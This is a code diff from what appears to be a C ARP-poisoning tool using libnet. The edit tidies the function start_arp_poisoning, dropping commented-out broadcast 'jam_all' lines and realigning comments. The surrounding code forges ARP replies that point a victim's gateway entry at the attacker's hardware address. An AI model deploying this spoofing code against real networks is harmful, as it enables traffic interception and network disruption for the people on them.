@@ -97,10 +97,8 @@ void check_prerequisites(int argc, char **argv)
  */
 void *start_arp_poisoning()
 {
-  // int jam_all = 0; // TODO change this so user will pass ip addres of victim
   libnet_t *ln;
   u_int32_t target_ip_addr, zero_ip_addr;
-  // u_int8_t bcast_hw_addr[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
 
   struct libnet_ether_addr *src_hw_addr;
   char errbuf[LIBNET_ERRBUF_SIZE];
@@ -113,12 +111,10 @@ void *start_arp_poisoning()
       ARPOP_REPLY,                   /* operation type       */
       src_hw_addr->ether_addr_octet, /* sender hardware addr */
       (u_int8_t *)&target_ip_addr,   /* gateway ip addr      */
-      // jam_all ? bcast_hw_addr : victim_hw_addr, /* victim hardware addr */
-      victim_hw_addr,            /* victim hardware addr */
-      (u_int8_t *)&zero_ip_addr, /* victim protocol addr */
-      ln);                       /* libnet context       */
+      victim_hw_addr,                /* victim hardware addr */
+      (u_int8_t *)&zero_ip_addr,     /* victim protocol addr */
+      ln);                           /* libnet context       */
   libnet_autobuild_ethernet(
-      // jam_all ? bcast_hw_addr : victim_hw_addr, /* ethernet destination */
       victim_hw_addr, /* ethernet destination */
       ETHERTYPE_ARP,  /* ethertype            */
       ln);            /* libnet context       */
